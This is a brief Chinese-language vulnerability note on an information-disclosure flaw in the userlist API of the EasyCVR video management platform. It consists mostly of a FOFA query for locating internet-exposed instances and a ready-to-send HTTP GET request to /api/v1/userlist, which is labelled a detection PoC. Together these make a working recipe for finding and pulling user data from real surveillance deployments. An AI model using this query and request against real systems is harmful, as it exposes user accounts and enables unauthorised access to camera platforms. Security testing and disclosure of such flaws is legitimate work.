# EasyCVR视频 userlist 敏感信息泄露漏洞

**fofa**

```
app="EasyCVR-视频管理平台"
```

**一、漏洞简述**

EasyCVR是在现有的及本期新建的各自独立运行的区域视频监控系统之上的视频资源管理平台，可实现视频的统一管理、授权和操控；可方便地提供视频扩容、共享。系统对整合范围内视频信号进行标准化、解码及信号控制等，并提供一个完整的集成管理界面，保证在安全网络中任何位置都可以控制、配置和诊断整个系统。平台支持开放服务接口，实现数据共享，支持集群化部署以及业务系统的本地系统及热备份并且具备数据备份机制。其接口userlist存在敏感信息泄露漏洞。

**二、漏洞检测poc**

```yaml
GET /api/v1/userlist?pageindex=0&pagesize=10 HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Connection: close
Content-Length: 0

```



